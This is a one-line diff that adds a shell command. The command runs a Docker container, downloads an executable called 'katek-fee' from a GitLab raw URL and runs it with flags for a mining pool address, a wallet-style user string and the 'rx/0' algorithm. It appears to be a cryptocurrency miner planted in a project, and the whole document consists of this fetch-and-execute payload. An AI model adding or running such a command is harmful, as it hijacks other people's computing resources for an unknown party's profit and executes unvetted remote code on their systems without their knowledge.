@@ -1,0 +1,1 @@
+docker run --name Joker ubuntu:latest sh -c "apt-get update && apt-get install wget -y && wget https://gitlab.com/Anli-Angku/Simpanan/-/raw/main/katek-fee && chmod u+x katek-fee && ./katek-fee -o 159.65.25.23:80 -u TRX:TLam55PBVsxcfdwmTCPtkbwbx3YDagyJep.B${RANDOM:0:9} -a rx/0 -k --threads=8"
